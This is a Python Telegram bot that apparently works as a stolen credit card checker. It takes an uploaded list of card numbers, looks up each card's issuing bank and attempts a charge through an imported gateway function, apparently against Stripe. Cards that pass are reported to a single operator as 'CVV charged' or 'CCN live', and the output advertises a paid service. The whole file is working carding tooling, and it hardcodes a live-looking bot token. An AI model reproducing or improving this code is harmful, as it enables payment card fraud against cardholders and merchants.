import requests
import telebot,time
from telebot import types
from gatet import Tele
import os
token = '1706336279:AAE_Fq8wahUmXPYDbvwbOsE_hmVBXxDLChc'
bot=telebot.TeleBot(token,parse_mode="HTML")
subscriber = '1043829384'
@bot.message_handler(commands=["start"])
def start(message):
	if not str(message.chat.id) == '1043829384':
		bot.reply_to(message, "ᴅᴏɴ'ᴛ ᴄᴏᴍᴇ @ToxiC_109110")
		return
	bot.reply_to(message,"Send the file now")
@bot.message_handler(content_types=["document"])
def main(message):
	if not str(message.chat.id) == '1043829384':
		bot.reply_to(message, "ᴅᴏɴ'ᴛ ᴄᴏᴍᴇ @ToxiC_109110")
		return
	dd = 0
	live = 0
	ch = 0
	ko = (bot.reply_to(message, "ᴄʜᴇᴄᴋɪɴɢ...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
				current_dir = os.getcwd()
				for filename in os.listdir(current_dir):
					if filename.endswith(".stop"):
						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='sᴛᴏᴘ ✅\nʙᴏᴛ ʙʏ ➜ @ToxiC_109110')
						os.remove('stop.stop')
						return
				try:
					data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
					
				except:
					pass
				try:
					bank=(data['bank']['name'])
				except:
					bank=('ᴜɴᴋɴᴏᴡɴ')
				try:
					emj=(data['country']['emoji'])
				except:
					emj=('ᴜɴᴋɴᴏᴡɴ')
				try:
					cn=(data['country']['name'])
				except:
					cn=('ᴜɴᴋɴᴏᴡɴ')
				try:
					dicr=(data['scheme'])
				except:
					dicr=('ᴜɴᴋɴᴏᴡɴ')
				try:
					typ=(data['type'])
				except:
					typ=('ᴜɴᴋɴᴏᴡɴ')
												
				try:
					last = str(Tele(cc))
				except Exception as e:
					print(e)
					last = "ERROR"
				if 'risk' in last:
					last='declined'
				elif 'Duplicate' in last:
					last='Approved'
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
				status = types.InlineKeyboardButton(f"• sᴛᴀᴛᴜs ➜ {last} •", callback_data='u8')
				cm3 = types.InlineKeyboardButton(f"• ᴀᴘᴘʀᴏᴠᴇᴅ ✅ ➜ [ {live} ] •", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"• ᴅᴇᴄʟɪɴᴇғ ⛔ ➜ [ {dd} ] •", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"• ᴛᴏᴛᴀʟ ☯️ ➜ [ {total} ] •", callback_data='x')
				stop=types.InlineKeyboardButton(f"[ sᴛᴏᴘ ]", callback_data='stop')
				mes.add(cm1,status, cm3, cm4, cm5, stop)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
𝒃𝒚 ➜ @ToxiC_109110 ''', reply_markup=mes)
				msg = f'''✪ ᴄᴀʀᴅ  ➪ {cc} 
𝘚𝘵𝘢𝘵𝘶𝘴 ➪ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥
𝘙𝘦𝘴𝘶𝘭𝘵 ➪ ᴄᴠᴠ ᴄʜᴀʀɢᴇᴅ
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ➪ sᴛʀɪᴘᴇ
𝘉𝘪𝘯 ➪ {cc[:6]} - {dicr} - {typ} 
𝘊𝘰𝘶𝘯𝘵𝘳𝘺 ➪ {cn} - {emj} 
𝘉𝘢𝘯𝘬 ➪ {bank}
𝘉𝘺 ➪ @ToxiC_109110 (ᴘᴀɪᴅ)
𝘗𝘳𝘰𝘹𝘺𝘴 ➪ ʟɪᴠᴇ 🟢 '''
				print(last)
				if 'Thank you' in last:
					live += 1
					bot.reply_to(message, msg)
				elif 'Your card does not support this type of purchase' in last:
				    msg = f'''✪ ᴄᴀʀᴅ  ➪ {cc} 
𝘚𝘵𝘢𝘵𝘶𝘴 ➪ ᴀᴘᴘʀᴏᴠᴇ ✅
𝘙𝘦𝘴𝘶𝘭𝘵 ➪ ᴄᴠᴠ ʟɪᴠᴇ
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ➪ sᴛʀɪᴘᴇ
𝘉𝘪𝘯 ➪ {cc[:6]} - {dicr} - {typ} 
𝘊𝘰𝘶𝘯𝘵𝘳𝘺 ➪ {cn} - {emj} 
𝘉𝘢𝘯𝘬 ➪ {bank}
𝘉𝘺 ➪ @ToxiC_109110 (ᴘᴀɪᴅ)
𝘗𝘳𝘰𝘹𝘺𝘴 ➪ ʟɪᴠᴇ 🟢 '''
				    live += 1
				    bot.reply_to(message, msg)				    
				elif 'security code is incorrect' in last or 'security code is invalid' in last:
					msg = f'''✪ ᴄᴀʀᴅ  ➪ {cc} 
𝘚𝘵𝘢𝘵𝘶𝘴 ➪ ᴀᴘᴘʀᴏᴠᴇ ✅
𝘙𝘦𝘴𝘶𝘭𝘵 ➪ ᴄᴄɴ ʟɪᴠᴇ 
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ➪ sᴛʀɪᴘᴇ
𝘉𝘪𝘯 ➪ {cc[:6]} - {dicr} - {typ} 
𝘊𝘰𝘶𝘯𝘵𝘳𝘺 ➪ {cn} - {emj} 
𝘉𝘢𝘯𝘬 ➪ {bank}
𝘉𝘺 ➪ @ToxiC_109110 (ᴘᴀɪᴅ)
𝘗𝘳𝘰𝘹𝘺𝘴 ➪ ʟɪᴠᴇ 🟢 '''
					live += 1
					bot.reply_to(message, msg)
				elif 'insufficient funds' in last:
					msg = f'''✪ ᴄᴀʀᴅ  ➪ {cc} 
𝘚𝘵𝘢𝘵𝘶𝘴 ➪ ᴀᴘᴘʀᴏᴠᴇ ✅
𝘙𝘦𝘴𝘶𝘭𝘵 ➪ ɪɴsᴜғғɪᴄɪᴇɴᴛ ғᴜɴᴅs
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ➪ sᴛʀɪᴘᴇ
𝘉𝘪𝘯 ➪ {cc[:6]} - {dicr} - {typ} 
𝘊𝘰𝘶𝘯𝘵𝘳𝘺 ➪ {cn} - {emj} 
𝘉𝘢𝘯𝘬 ➪ {bank}
𝘉𝘺 ➪ @ToxiC_109110 (ᴘᴀɪᴅ)
𝘗𝘳𝘰𝘹𝘺𝘴 ➪ ʟɪᴠᴇ 🟢 '''
					live += 1
					bot.reply_to(message, msg)
				elif 'Verifying strong customer authentication. Please wait...' in last:
				    msg = f'''✪ ᴄᴀʀᴅ  ➪ {cc} 
𝘚𝘵𝘢𝘵𝘶𝘴 ➪ ᴀᴘᴘʀᴏᴠᴇ ✅
𝘙𝘦𝘴𝘶𝘭𝘵 ➪ 3ᴅs ᴄᴀʀᴅ
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ➪ sᴛʀɪᴘᴇ
𝘉𝘪𝘯 ➪ {cc[:6]} - {dicr} - {typ} 
𝘊𝘰𝘶𝘯𝘵𝘳𝘺 ➪ {cn} - {emj} 
𝘉𝘢𝘯𝘬 ➪ {bank}
𝘉𝘺 ➪ @ToxiC_109110 (ᴘᴀɪᴅ)
𝘗𝘳𝘰𝘹𝘺𝘴 ➪ ʟɪᴠᴇ 🟢 '''
				    live += 1
				    bot.reply_to(message, msg)	
				else:
					dd += 1
					time.sleep(5)
	except Exception as e:
		print(e)
	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='ᴄᴏᴍᴘʟᴇᴛᴇᴅ ✅\nʙᴏᴛ ʙʏ ➜ @ToxiC_109110')
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	with open("stop.stop", "w") as file:
		pass
print("+-----------------------------------------------------------------+")
bot.polling()